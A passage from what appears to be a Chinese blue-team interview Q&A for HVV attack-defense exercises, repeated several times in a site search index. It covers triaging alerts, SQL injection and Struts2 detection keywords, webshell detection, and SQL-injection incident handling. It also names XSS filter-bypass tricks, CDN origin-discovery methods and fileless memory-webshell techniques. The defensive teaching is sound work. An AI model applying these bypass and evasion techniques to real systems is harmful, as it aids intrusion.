漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#攻击研判"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#1怎么确定是真实攻击还是误报"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#2cdn如何绕过"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#3常用的webshell检测工具"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#4struts2命令执行的流量特征"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#5确定红队在打服务器而且进行文件上传的操作怎么判断是不是webshell"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 